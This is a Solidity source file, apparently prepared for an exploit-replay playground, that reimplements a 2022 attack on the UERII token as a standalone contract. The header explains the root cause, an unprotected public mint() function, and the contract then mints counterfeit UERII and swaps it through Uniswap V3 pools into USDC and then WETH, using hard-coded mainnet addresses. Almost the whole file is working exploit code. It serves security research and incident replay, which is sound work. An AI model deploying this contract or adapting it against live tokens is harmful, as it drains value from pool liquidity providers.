// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-Uerii).
//
// The DeFiHackLabs Foundry PoC runs the whole attack INLINE in the `ContractTest`
// test contract (there is no standalone exploit contract): `testExploit()` calls
// `UERII.mint()` directly, then swaps the freshly-minted UERII → USDC → WETH via
// the Uniswap V3 router, with `address(this)` as every swap recipient. This file
// copies that inline attack verbatim into a self-contained standalone contract
// (minimal inlined interfaces, no imports) so the Playground can deploy + record
// it. The recorder measures the deployed contract's WETH delta (profitReceiver:
// "exploit"), which starts at 0 and ends at ~1.8552 WETH.
//
// Root cause: UERII's `mint()` is `public` with NO access control (no onlyOwner /
// role / cap). Anyone can mint a hard-coded 1e17 raw units (100B tokens at 6
// decimals — equal to the entire constructor supply) per call, then dump that
// counterfeit inventory into the UERII/USDC pool for real value.

interface IERC20 {
    function mint() external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params)
        external
        payable
        returns (uint256 amountOut);
}

contract UeriiMintExploit {
    // UERII token — the vulnerable contract (Ethereum mainnet).
    IERC20 constant UERII = IERC20(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);
    // USDC and WETH (Ethereum mainnet, 6 / 18 decimals).
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    // Uniswap V3 SwapRouter.
    IUniswapV3Router constant ROUTER =
        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // The whole attack — a single call needing no capital. The recorder invokes
    // this as the deployed exploit contract; profit lands back here as WETH.
    function run() external {
        // 1. Print 100B UERII out of thin air: mint() is fully public, no auth.
        UERII.mint();

        // 2. Dump the entire minted UERII into the UERII/USDC V3 pool (fee 500).
        UERII.approve(address(ROUTER), type(uint256).max);
        ROUTER.exactInputSingle(
            IUniswapV3Router.ExactInputSingleParams({
                tokenIn: address(UERII),
                tokenOut: address(USDC),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: UERII.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // 3. Convert all the USDC proceeds to WETH via the USDC/WETH V3 pool (fee 500).
        USDC.approve(address(ROUTER), type(uint256).max);
        ROUTER.exactInputSingle(
            IUniswapV3Router.ExactInputSingleParams({
                tokenIn: address(USDC),
                tokenOut: address(WETH),
                fee: 500,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: USDC.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }
}
